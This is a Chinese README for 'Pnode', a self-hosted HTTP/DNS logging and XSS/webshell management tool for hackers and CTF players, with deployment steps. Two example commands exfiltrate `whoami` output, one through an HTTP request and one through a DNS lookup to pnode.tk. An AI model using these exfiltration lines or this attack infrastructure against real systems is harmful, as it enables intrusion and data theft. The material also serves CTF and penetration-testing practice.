```
   ___                 _      
  / _ \_ __   ___   __| | ___ 
 / /_)/ '_ \ / _ \ / _` |/ _ \
/ ___/| | | | (_) | (_| |  __/
\/    |_| |_|\___/ \__,_|\___|
                              
```



### 项目名称

Pnode

### 项目描述

前端使用Boostrap框架，后端使用thinkphp5框架开发

适用于hacker&CTFer

可以满足日常的需求，并且可以直接在WEB端管理&编辑一些文件用于远程加载

### 功能介绍

* HTTP log
* DNS log
* XSS攻击管理模块
* WebShell等文件管理模块

```
curl http://127.0.0.1:10082/public/?c=`whoami`
```



![](https://ws4.sinaimg.cn/large/006tNc79ly1fzbpadxielj31ik0m6ac2.jpg)



```
ping -c 2 `whoami`.pnode.tk
```



![](https://ws1.sinaimg.cn/large/006tNc79ly1fzb0a7st2ej31fc0dmdi0.jpg)

![](https://ws1.sinaimg.cn/large/006tNc79ly1fzbr5mp56uj31fb0u0afo.jpg)

![](https://ws2.sinaimg.cn/large/006tNc79ly1fzbr6j7i0zj31r00su41a.jpg)





### 环境部署

LAMP环境即可

修改database.php中数据库账号密码

自行修改默认登陆密码(md5后的)

```
update users set password=md5('admin') where username='admin'
```

如果需要DNS log功能,首先`https://my.freenom.com/`注册一个账号,然后免费申请一个域名

![](https://ws3.sinaimg.cn/large/006tNc79ly1fzb0n0s9k9j320g0rygu7.jpg)

![](https://ws4.sinaimg.cn/large/006tNc79ly1fzb0otdeumj31se0o2n0g.jpg)

然后将你的vps的外网ip填入

然后一直继续即可

然后将dns.py放入到`/tmp`目录下

修改dns.py为你的域名和你的vps ip,然后手动启动dns服务

```
nohup python /tmp/dns.py &
```

在一个小时左右将会解析成功,然后就可以接受到log。


* PS:部分模块代码取自火日师傅项目,感谢。
